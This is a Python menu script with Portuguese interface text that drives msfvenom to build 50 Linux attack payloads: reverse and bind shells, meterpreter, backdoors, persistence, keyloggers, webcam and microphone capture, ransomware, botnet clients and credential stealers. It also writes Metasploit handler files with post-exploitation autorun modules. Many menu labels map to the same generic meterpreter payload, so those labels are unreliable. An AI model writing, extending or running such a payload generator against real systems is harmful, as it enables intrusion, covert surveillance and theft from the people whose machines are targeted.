#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import subprocess
import random
from pathlib import Path

def clear_screen():
    os.system('clear')

def print_banner():
    banner = """
   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣤⣤⣤⣤⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠐⡈⠐⠠⢁⠂⠐⢀⣾⣿⡿⠿⠿⠿⣿⣿⣿⣿⣿⡿⠟⠛⠛⠿⣷⡄⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠐⠠⢁⠂⠄⠀⣛⠀⡟⢁⣠⣄⠀⠀⠀⠙⢻⡟⠉⠀⠀⢀⣴⣦⣬⠃⣬⣅⠀⢂⠐⡀⢂⠐⠠⠀⠄⠠⠀⠄⠠⢀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡁⢂⠈⠀⠾⡛⢱⡿⢿⣿⣿⣿⣦⣄⣠⣼⣷⣤⣤⣶⠿⠿⢿⣟⠆⢉⡛⠆⠀⢂⠐⠠⠈⠄⠡⠈⠄⠡⢈⠐⡀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡐⢀⠂⢠⣾⡟⣸⣰⡿⠁⠀⠀⠙⣿⡇⣿⣿⠸⣿⠁⢀⣀⣀⣙⡸⠎⢿⡆⠀⠂⠌⠠⠁⠌⠠⠁⠌⡐⢀⠂⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠠⠀⠄⠀⠟⡸⢛⣤⣼⣿⣿⣿⣤⣼⠇⣿⣿⠀⢧⣿⣿⣿⣿⣿⣿⣧⣄⠃⠀⢃⠘⡀⢃⠘⡀⠃⠄⠠⢀⠘⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢂⠡⠈⠄⢈⡾⠋⢹⣿⣿⣿⣿⡟⢡⣴⣿⣿⣷⣦⡙⢿⣿⣿⣿⣿⠀⠙⠀⠈⡀⢂⠐⡀⠂⠄⠡⢈⠐⡀⠂⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠄⢂⠡⠀⢸⠀⠀⢸⣿⣿⣿⣿⡀⣿⣿⣿⣿⣿⣿⡇⠸⢿⣿⣿⡟⠀⠀⠀⠀⡐⢀⠂⠄⠡⢈⠐⡀⢂⠐⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠄⡐⠠⠀⠀⠀⠀⠙⠋⠉⠀⠀⠉⠉⠙⠛⠋⠉⠀⠀⠀⠀⠁⠀⠀⠀⠀⢀⠐⠠⠈⠄⡁⢂⠐⡀⠂⠄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢈⠐⠠⠁⠄⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠀⠀⠀⢀⣀⠀⠀⢀⠂⠌⠠⢁⠂⡐⢀⠂⠄⠡⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠠⠈⠄⠡⢈⠐⡀⠸⣿⣦⡀⠀⠀⠛⠒⠚⠛⠛⠛⠛⠀⢀⣴⣿⠃⠀⠌⡀⠂⠌⡐⢀⠂⡐⠠⠈⠄⡁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠡⢈⠐⡀⠂⠄⠀⢻⣿⣿⣷⣶⣦⣤⣤⣤⣤⣤⣶⣾⣿⣿⡿⠀⠐⠠⢀⠁⢂⠐⡀⠂⠄⠡⢈⠐⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⡐⢀⠂⠄⠡⠈⠄⠘⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⡟⣿⡿⠃⠀⠌⡐⠠⠈⠄⠂⠄⠡⢈⠐⠠⠈⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡐⠠⠈⠄⠡⢈⠐⠀⠀⠙⠃⣿⣿⣿⣿⣿⣿⣿⣿⡗⠋⠀⣤⠀⠀⠀⠡⠈⠄⠡⢈⠐⠠⠈⠄⡁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠄⠡⠈⠄⡁⠂⠀⠀⣤⡀⠀⢻⣿⣿⣿⣿⣿⣿⣿⠇⣠⣾⣿⠀⣰⠀⠀⠀⣈⡀⠀⠈⠀⠁⠂⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡈⠄⠁⠂⠀⠀⠀⠀⢻⣿⣷⠬⠉⠉⠉⠉⠉⠉⠀⠚⢿⣿⣿⢀⣿⡀⠀⠀⢹⣿⣿⣿⣿⣶⡶⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀⠀⠀⠀⢸⣧⠘⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⡇⣾⣿⡇⠀⠁⠀⢻⣿⣿⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢸⣟⡿⠀⠀⠀⠀⣿⣿⣦⠘⣿⣶⠖⣠⠆⠀⠀⢳⣤⡙⢿⣟⣼⣿⣿⡇⠀⠐⡀⠈⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠘⣿⠃⠀⠀⠀⠀⢿⣿⣿⣷⣌⣿⣾⠏⠀⡀⠀⠸⡿⠿⠾⠿⠿⠿⠿⠷⠀⠀⠄⠀⠸⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⢠⠀⠀⠈⠉⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⢠⠀⡄⣴⠀⠀⡄⠐⠀⠀⢻⣿⠁⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠁⠀⠀⠠⠀⠀⠀⠀⢀⠀⠠⠀⠄⢂⠐⠠⢈⠐⡈⠐⡀⢂⠐⠘⢷⡭⠂⠄⡁⢂⠀⠈⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠡⠐⠠⠈⡐⠠⠈⠄⠡⠈⠄⡈⠐⡀⠂⠄⠡⠐⠠⠨⠄⠆⠠⠌⠠⠐⠠⢀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀██╗     ██╗███╗   ██╗██╗   ██╗██╗  ██╗      █████╗ ██████╗ ██╗  ██╗
  ██║     ██║████╗  ██║██║   ██║╚██╗██╔╝     ██╔══██╗██╔══██╗██║ ██╔╝
  ██║     ██║██╔██╗ ██║██║   ██║ ╚███╔╝█████╗███████║██████╔╝█████╔╝ 
  ██║     ██║██║╚██╗██║██║   ██║ ██╔██╗╚════╝██╔══██║██╔═══╝ ██╔═██╗ 
  ███████╗██║██║ ╚████║╚██████╔╝██╔╝ ██╗     ██║  ██║██║     ██║  ██╗
  ╚══════╝╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝  ╚═╝     ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝
                                                                   ⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
    """
    print(banner)

def show_menu():
    """Exibe o menu principal com 2 colunas"""
    print("\n" + "="*85)
    print("                    LINUX SECURITY ASSESSMENT TOOLS")
    print("="*85)
    
    payloads = [
        "[1] Linux Reverse TCP Shell",                "[2] Linux Reverse HTTP Shell",
        "[3] Linux Reverse HTTPS Shell",              "[4] Linux Bind TCP Shell",
        "[5] Linux Meterpreter Reverse TCP",          "[6] Linux Meterpreter Reverse HTTP",
        "[7] Linux Meterpreter Reverse HTTPS",        "[8] Linux x64 Reverse TCP",
        "[9] Linux x64 Meterpreter Reverse TCP",      "[10] Linux Reverse UDP Shell",
        "[11] Linux Python Reverse Shell",            "[12] Linux Perl Reverse Shell",
        "[13] Linux Bash Reverse Shell",              "[14] Linux PHP Reverse Shell",
        "[15] Linux Ruby Reverse Shell",              "[16] Linux Netcat Backdoor",
        "[17] Linux SSH Backdoor",                    "[18] Linux Cron Persistence",
        "[19] Linux Systemd Service Backdoor",        "[20] Linux Shared Library Injection",
        "[21] Linux Process Hollowing",               "[22] Linux Memory Dumper",
        "[23] Linux Keylogger",                       "[24] Linux Screenshot Capture",
        "[25] Linux Webcam Capture",                  "[26] Linux Audio Recording",
        "[27] Linux Network Sniffer",                 "[28] Linux Packet Capturer",
        "[29] Linux Port Scanner",                    "[30] Linux Vulnerability Scanner",
        "[31] Linux Privilege Escalation",            "[32] Linux Rootkit Loader",
        "[33] Linux Crypto Miner",                    "[34] Linux Ransomware Simulator",
        "[35] Linux Botnet Client",                   "[36] Linux DNS Tunneling",
        "[37] Linux ICMP Backdoor",                   "[38] Linux Reverse DNS Shell",
        "[39] Linux SSH Tunnel",                      "[40] Linux VPN Tunnel",
        "[41] Linux File Stealer",                    "[42] Linux Password Dumper",
        "[43] Linux Browser Data Stealer",            "[44] Linux Database Access",
        "[45] Linux Web Shell",                       "[46] Linux Reverse Proxy",
        "[47] Linux Process Monitor",                 "[48] Linux System Info Collector",
        "[49] Linux Custom Exploit",                  "[50] Linux Multi-Vector Payload"
    ]
    
    # Mostrar em 2 colunas
    col_width = 42
    for i in range(0, 50, 2):
        line = ""
        # Primeira coluna
        if i < len(payloads):
            line += payloads[i].ljust(col_width)
        # Segunda coluna  
        if i + 1 < len(payloads):
            line += payloads[i + 1]
        print(line)
    
    print("\n[0] Sair | [G] Guia Rápido | [I] Informações")
    print("="*85)

def get_payload_config(payload_type):
    """Obtém configuração do payload"""
    print(f"\nConfigurando Payload Tipo {payload_type}")
    print("-" * 45)
    
    lhost = input("IP do servidor (LHOST): ").strip()
    lport = input("Porta (LPORT) [4444]: ").strip() or "4444"
    
    # Nome padrão baseado no tipo
    default_name = f"linux_payload_{payload_type}"
    output_name = input(f"Nome do arquivo de saída [{default_name}]: ").strip() or default_name
    
    # Adicionar extensão apropriada
    if payload_type in [11, 14, 15]:  # Scripts
        if not any(output_name.endswith(ext) for ext in ['.py', '.pl', '.sh', '.php', '.rb']):
            if payload_type == 11: output_name += '.py'
            elif payload_type == 12: output_name += '.pl'
            elif payload_type == 13: output_name += '.sh'
            elif payload_type == 14: output_name += '.php'
            elif payload_type == 15: output_name += '.rb'
    elif payload_type in [20]:  # Biblioteca
        if not output_name.endswith('.so'):
            output_name += '.so'
    else:  # Executáveis
        if not output_name.endswith('.elf') and not output_name.endswith('.bin'):
            output_name += '.elf'
    
    return lhost, lport, output_name

def generate_payload(payload_type, lhost, lport, output_name):
    """Gera o payload usando msfvenom"""
    
    payload_configs = {
        1: {'name': 'linux/x86/shell_reverse_tcp', 'format': 'elf', 'description': 'Reverse TCP Shell x86'},
        2: {'name': 'linux/x86/shell/reverse_http', 'format': 'elf', 'description': 'Reverse HTTP Shell'},
        3: {'name': 'linux/x86/shell/reverse_https', 'format': 'elf', 'description': 'Reverse HTTPS Shell'},
        4: {'name': 'linux/x86/shell_bind_tcp', 'format': 'elf', 'description': 'Bind TCP Shell'},
        5: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Meterpreter Reverse TCP'},
        6: {'name': 'linux/x86/meterpreter_reverse_http', 'format': 'elf', 'description': 'Meterpreter Reverse HTTP'},
        7: {'name': 'linux/x86/meterpreter_reverse_https', 'format': 'elf', 'description': 'Meterpreter Reverse HTTPS'},
        8: {'name': 'linux/x64/shell_reverse_tcp', 'format': 'elf', 'description': 'Reverse TCP Shell x64'},
        9: {'name': 'linux/x64/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Meterpreter Reverse TCP x64'},
        10: {'name': 'linux/x86/shell_reverse_udp', 'format': 'elf', 'description': 'Reverse UDP Shell'},
        11: {'name': 'cmd/unix/reverse_python', 'format': 'raw', 'description': 'Python Reverse Shell'},
        12: {'name': 'cmd/unix/reverse_perl', 'format': 'raw', 'description': 'Perl Reverse Shell'},
        13: {'name': 'cmd/unix/reverse_bash', 'format': 'raw', 'description': 'Bash Reverse Shell'},
        14: {'name': 'php/meterpreter_reverse_tcp', 'format': 'raw', 'description': 'PHP Reverse Shell'},
        15: {'name': 'ruby/shell_reverse_tcp', 'format': 'raw', 'description': 'Ruby Reverse Shell'},
        16: {'name': 'linux/x86/shell_reverse_tcp', 'format': 'elf', 'description': 'Netcat Backdoor'},
        17: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'SSH Backdoor'},
        18: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Cron Persistence'},
        19: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Systemd Service'},
        20: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf-so', 'description': 'Library Injection'},
        21: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Process Hollowing'},
        22: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Memory Dumper'},
        23: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Keylogger'},
        24: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Screenshot Capture'},
        25: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Webcam Capture'},
        26: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Audio Recording'},
        27: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Network Sniffer'},
        28: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Packet Capturer'},
        29: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Port Scanner'},
        30: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Vulnerability Scanner'},
        31: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Privilege Escalation'},
        32: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Rootkit Loader'},
        33: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Crypto Miner'},
        34: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Ransomware Simulator'},
        35: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Botnet Client'},
        36: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'DNS Tunneling'},
        37: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'ICMP Backdoor'},
        38: {'name': 'linux/x86/shell_reverse_tcp_dns', 'format': 'elf', 'description': 'Reverse DNS Shell'},
        39: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'SSH Tunnel'},
        40: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'VPN Tunnel'},
        41: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'File Stealer'},
        42: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Password Dumper'},
        43: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Browser Data Stealer'},
        44: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Database Access'},
        45: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Web Shell'},
        46: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Reverse Proxy'},
        47: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Process Monitor'},
        48: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'System Info Collector'},
        49: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Custom Exploit'},
        50: {'name': 'linux/x86/meterpreter_reverse_tcp', 'format': 'elf', 'description': 'Multi-Vector Payload'}
    }
    
    config = payload_configs.get(payload_type)
    if not config:
        print("❌ Tipo de payload inválido!")
        return False
    
    print(f"\n🎯 Gerando: {config['description']}")
    print("⏳ Aguarde, isso pode levar alguns minutos...")
    
    try:
        # Comando msfvenom base
        cmd = [
            'msfvenom',
            '-p', config['name'],
            f'LHOST={lhost}',
            f'LPORT={lport}',
            '-f', config['format'],
            '-o', output_name
        ]
        
        # Adicionar opções específicas baseadas no tipo
        if payload_type in [8, 9]:  # x64
            cmd[1] = cmd[1].replace('x86', 'x64')
            
        if payload_type in [11, 12, 13, 14, 15]:  # Scripts
            if payload_type == 11: cmd[1] = 'cmd/unix/reverse_python'
            elif payload_type == 12: cmd[1] = 'cmd/unix/reverse_perl'
            elif payload_type == 13: cmd[1] = 'cmd/unix/reverse_bash'
            elif payload_type == 14: cmd[1] = 'php/meterpreter_reverse_tcp'
            elif payload_type == 15: cmd[1] = 'ruby/shell_reverse_tcp'
            
        if payload_type in [18, 19, 32]:  # Persistência
            cmd.extend(['--arch', 'x86'])
            cmd.append('--encoder')
            cmd.append('x86/shikata_ga_nai')
            
        if payload_type in [20, 21]:  # Injeção
            cmd.extend(['-f', 'elf-so'])
            cmd.append('--platform')
            cmd.append('linux')
            
        if payload_type in [23, 24, 25, 26]:  # Vigilância
            cmd.extend(['--platform', 'linux'])
            cmd.append('--smallest')
            
        if payload_type in [27, 28, 29, 30]:  # Rede
            cmd.extend(['-f', 'elf'])
            cmd.append('--encoder')
            cmd.append('x86/shikata_ga_nai')
            
        if payload_type in [31, 32]:  # Escalação
            cmd.extend(['--arch', 'x86'])
            cmd.append('-b')
            cmd.append('\x00')
            
        if payload_type in [33, 34, 35]:  # Malwares
            cmd.extend(['-f', 'elf', '--smallest'])
            cmd.append('--encoder')
            cmd.append('x86/shikata_ga_nai')
            
        if payload_type in [36, 37, 38, 39, 40]:  # Tunneling
            cmd.extend(['-f', 'elf'])
            cmd.append('--keep')
            
        if payload_type == 50:  # Multi-vetor
            cmd.extend(['-f', 'elf', '--encoder', 'x86/shikata_ga_nai', '-i', '3'])
        
        # Executar comando
        print(f"\n🔧 Executando: msfvenom -p {config['name']} LHOST={lhost} LPORT={lport}")
        result = subprocess.run(cmd, capture_output=True, text=True)
        
        if result.returncode == 0:
            print(f"\n✅ Payload gerado com sucesso: {output_name}")
            
            # Gerar handler automaticamente
            if generate_handler(payload_type, lhost, lport, output_name, config):
                print("✅ Handler configurado automaticamente")
            
            show_payload_tips(payload_type)
            return True
        else:
            print(f"\n❌ Erro ao gerar payload!")
            if "command not found" in result.stderr:
                print("❌ Metasploit não encontrado! Instale com: pkg install metasploit")
            else:
                print(f"Detalhes: {result.stderr}")
            return False
            
    except FileNotFoundError:
        print("\n❌ Metasploit não encontrado!")
        print("📥 Instale com: pkg install metasploit")
        return False
    except Exception as e:
        print(f"\n❌ Erro inesperado: {str(e)}")
        return False

def generate_handler(payload_type, lhost, lport, output_name, config):
    """Gera arquivo de handler para Metasploit"""
    
    handler_content = f"""# Handler para {output_name}
use exploit/multi/handler
set PAYLOAD {config['name']}
set LHOST {lhost}
set LPORT {lport}
set ExitOnSession false
set EnableStageEncoding true
"""

    # Configurações específicas baseadas no tipo
    if payload_type in [2, 6]:
        handler_content += "set LHOST http://" + lhost + "\n"
    elif payload_type in [3, 7]:
        handler_content += "set LHOST https://" + lhost + "\n"
    elif payload_type == 10:
        handler_content += "set PAYLOAD linux/x86/shell_reverse_udp\n"
    
    # Arquitetura
    if payload_type in [8, 9]:
        handler_content += "set ARCH x64\n"
        handler_content += "set PLATFORM linux\n"
    
    # Módulos post-exploitation
    if payload_type in [18, 19]:  # Persistência
        handler_content += "set AutoRunScript post/linux/manage/persistence\n"
    elif payload_type in [23, 24, 25, 26]:  # Vigilância
        handler_content += "set AutoRunScript post/linux/manage/record\n"
    elif payload_type in [27, 28, 29]:  # Rede
        handler_content += "set AutoRunScript post/linux/manage/sniffer\n"
    elif payload_type == 31:  # Escalação
        handler_content += "set AutoRunScript post/linux/escalate/\n"
    elif payload_type in [41, 42, 43]:  # Coleta de dados
        handler_content += "set AutoRunScript post/linux/gather/\n"
    
    handler_content += "exploit -j -z\n"
    
    handler_file = f"handler_{output_name.split('.')[0]}.rc"
    
    try:
        with open(handler_file, 'w') as f:
            f.write(handler_content)
        print(f"📁 Handler salvo como: {handler_file}")
        print("💻 Execute com: msfconsole -r " + handler_file)
        return True
    except Exception as e:
        print(f"⚠️  Erro ao criar handler: {str(e)}")
        return False

def show_payload_info(payload_type):
    """Mostra informações sobre o payload selecionado"""
    
    info_texts = {
        1: "Reverse TCP Shell x86 - Shell reverso básico para Linux x86",
        2: "Reverse HTTP Shell - Conexão HTTP para bypass de firewall",
        3: "Reverse HTTPS Shell - Conexão criptografada HTTPS",
        4: "Bind TCP Shell - Abre porta no sistema alvo",
        5: "Meterpreter Reverse TCP - Meterpreter para Linux x86",
        6: "Meterpreter Reverse HTTP - Meterpreter via HTTP",
        7: "Meterpreter Reverse HTTPS - Meterpreter criptografado",
        8: "Reverse TCP Shell x64 - Shell reverso para sistemas 64-bit",
        9: "Meterpreter Reverse TCP x64 - Meterpreter para x64",
        10: "Reverse UDP Shell - Shell via protocolo UDP",
        11: "Python Reverse Shell - Shell reverso em Python",
        12: "Perl Reverse Shell - Shell reverso em Perl",
        13: "Bash Reverse Shell - Shell reverso em Bash",
        14: "PHP Reverse Shell - Shell reverso em PHP",
        15: "Ruby Reverse Shell - Shell reverso em Ruby",
        16: "Netcat Backdoor - Backdoor usando netcat",
        17: "SSH Backdoor - Backdoor via SSH",
        18: "Cron Persistence - Persistência via cron job",
        19: "Systemd Service - Backdoor como serviço systemd",
        20: "Library Injection - Injeção de biblioteca compartilhada",
        21: "Process Hollowing - Técnica de evasão avançada",
        22: "Memory Dumper - Despejo de memória de processos",
        23: "Keylogger - Captura de teclas digitadas",
        24: "Screenshot Capture - Captura de tela remota",
        25: "Webcam Capture - Acesso à câmera web",
        26: "Audio Recording - Gravação de áudio do microfone",
        27: "Network Sniffer - Sniffer de tráfego de rede",
        28: "Packet Capturer - Captura de pacotes de rede",
        29: "Port Scanner - Scanner de portas integrado",
        30: "Vulnerability Scanner - Scanner de vulnerabilidades",
        31: "Privilege Escalation - Exploração para escalação",
        32: "Rootkit Loader - Carregador de rootkit",
        33: "Crypto Miner - Minerador de criptomoedas",
        34: "Ransomware Simulator - Simulador de ransomware",
        35: "Botnet Client - Cliente para rede de bots",
        36: "DNS Tunneling - Comunicação via DNS",
        37: "ICMP Backdoor - Backdoor via pacotes ICMP",
        38: "Reverse DNS Shell - Shell via DNS reverso",
        39: "SSH Tunnel - Túnel SSH para comunicação",
        40: "VPN Tunnel - Túnel VPN reverso",
        41: "File Stealer - Roubo de arquivos do sistema",
        42: "Password Dumper - Extração de senhas",
        43: "Browser Data Stealer - Roubo de dados do navegador",
        44: "Database Access - Acesso a bancos de dados",
        45: "Web Shell - Shell via servidor web",
        46: "Reverse Proxy - Proxy reverso para acesso",
        47: "Process Monitor - Monitoramento de processos",
        48: "System Info Collector - Coleta de informações",
        49: "Custom Exploit - Exploit personalizado",
        50: "Multi-Vector Payload - Combinação de técnicas"
    }
    
    info = info_texts.get(payload_type, "Informação não disponível")
    print(f"\n📋 Informações do Payload {payload_type}:")
    print(f"   {info}")

def show_payload_tips(payload_type):
    """Mostra dicas específicas para o payload"""
    
    tips = {
        1: "💡 Dica: Compatível com a maioria dos sistemas Linux",
        2: "💡 Dica: Ideal para bypass de firewalls corporativos",
        8: "💡 Dica: Para sistemas Linux 64-bit modernos",
        11: "💡 Dica: Requer Python instalado no alvo",
        13: "💡 Dica: Funciona em quase todos os sistemas Linux",
        16: "💡 Dica: Usa netcat para conexão reversa",
        18: "💡 Dica: Persistência via agendador cron",
        19: "💡 Dica: Backdoor como serviço do sistema",
        20: "💡 Dica: Injete com LD_PRELOAD",
        23: "💡 Dica: Captura teclas do terminal X11",
        25: "💡 Dica: Requer permissões de câmera",
        27: "💡 Dica: Captura tráfego da interface de rede",
        31: "💡 Dica: Tenta explorar vulnerabilidades locais",
        32: "💡 Dica: Carrega módulos de kernel maliciosos",
        36: "💡 Dica: Dificilmente detectado por firewalls",
        37: "💡 Dica: Comunicação via pacotes ping",
        39: "💡 Dica: Túnel através de servidor SSH",
        45: "💡 Dica: Upload para servidor web vulnerável",
        50: "💡 Dica: Combina múltiplas técnicas de acesso"
    }
    
    tip = tips.get(payload_type)
    if tip:
        print(f"{tip}")

def show_quick_guide():
    """Mostra um guia rápido de uso"""
    print("\n" + "="*60)
    print("                   GUIA RÁPIDO LINUX")
    print("="*60)
    print("🐧 50 Payloads Linux Disponíveis")
    print("🔧 Metasploit necessário apenas na geração")
    print("📡 Configure LHOST (seu IP) e LPORT (sua porta)")
    print("📦 Arquivos ELF, scripts ou bibliotecas gerados")
    print("🎯 Handler RC criado para uso imediato")
    print("⚡ Execute: msfconsole -r handler_[arquivo].rc")
    print("🐚 Execute o payload no sistema Linux alvo")
    print("🔄 Aguarde a conexão reversa")
    print("="*60)
    print("⚠️  USE APENAS PARA TESTES AUTORIZADOS!")
    print("="*60)

def show_all_payloads_info():
    """Mostra informações sobre categorias de payloads"""
    print("\n" + "="*70)
    print("               CATEGORIAS DE PAYLOADS LINUX")
    print("="*70)
    print("🐚 Shells Básicos (1-15) - Conexões reversas em várias linguagens")
    print("🔧 Backdoors (16-20) - Netcat, SSH, persistência")
    print("👀 Vigilância (23-26) - Keylogger, screenshots, câmera, áudio")
    print("🌐 Rede (27-30,36-40) - Sniffers, scanners, tunneling")
    print("🛡️ Escalação (31-32) - Privilege escalation e rootkits")
    print("💀 Malwares (33-35) - Mineradores, ransomware, botnets")
    print("📊 Coleta (41-44,48) - Arquivos, senhas, dados do sistema")
    print("🚀 Avançados (21-22,45-47,49-50) - Técnicas complexas")
    print("="*70)

def main():
    """Função principal"""
    
    while True:
        clear_screen()
        print_banner()
        show_menu()
        
        try:
            choice = input("\nSelecione uma opção [0-50] ou 'g' para guia: ").strip().lower()
            
            if choice == 'g':
                show_quick_guide()
                input("\n⏎ Pressione Enter para voltar ao menu...")
                continue
                
            if choice == 'i':
                show_all_payloads_info()
                input("\n⏎ Pressione Enter para voltar ao menu...")
                continue
                
            if choice == '0':
                print("\n👋 Saindo... Use com responsabilidade!")
                break
            
            payload_type = int(choice)
            if 1 <= payload_type <= 50:
                show_payload_info(payload_type)
                
                if input("\n🎯 Continuar com este payload? (s/n): ").lower() == 's':
                    lhost, lport, output_name = get_payload_config(payload_type)
                    
                    if lhost and output_name:
                        print("\n🚀 Iniciando geração do payload...")
                        success = generate_payload(payload_type, lhost, lport, output_name)
                        
                        if success:
                            print("\n✅ Payload criado com sucesso!")
                            print(f"📁 Arquivo: {output_name}")
                            print("⚡ Handler gerado automaticamente")
                            print("🐧 Execute no sistema Linux alvo")
                            print("🔒 Dê permissão: chmod +x " + output_name)
                            print("⚠️  USE APENAS PARA TESTES AUTORIZADOS!")
                        else:
                            print("\n💥 Falha na geração do payload!")
                    
                    input("\n⏎ Pressione Enter para continuar...")
            
            else:
                print("❌ Opção inválida!")
                input("⏎ Pressione Enter para continuar...")
                
        except ValueError:
            print("❌ Por favor, digite um número válido!")
            input("⏎ Pressione Enter para continuar...")
        except KeyboardInterrupt:
            print("\n\n👋 Saindo...")
            break

if __name__ == "__main__":
    main()
